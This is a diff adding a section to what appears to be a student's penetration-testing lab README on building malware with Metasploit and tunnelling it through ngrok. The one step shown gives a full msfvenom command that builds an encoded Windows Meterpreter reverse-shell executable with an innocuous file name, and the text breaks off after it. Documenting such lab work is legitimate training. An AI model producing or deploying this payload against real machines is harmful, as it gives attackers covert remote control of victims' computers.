@@ -170,3 +170,27 @@ These directories are **critical** for penetration testers and forensic analysts
    ```bash
    nmap --help
    man nmap
+
+
+# Malware Creation, Tunneling, and Testing
+
+1. Create exe and apk file (Malware)
+2. Test your own environment
+3. Create Tunnel using ngrok
+4. Upload complete process of your simulation with appropriate screenshot into GitHub
+
+## 🛠️ Tools Used
+*   **OS:** Kali Linux (Attacker) & Windows 10 (Victim)
+*   **Tools:** Metasploit Framework (msfvenom, msfconsole), Ngrok.
+
+---
+
+## 🚀 Step-by-Step Process
+
+### Step 1: Create exe and apk file (Malware)
+I used `msfvenom` to generate the payloads. 
+
+**1. Creating the Windows `.exe` file:**
+*Command used:*
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP_Here> LPORT=5555 -e x86/shikata_ga_nai -i 5 -f exe -o system123.exe
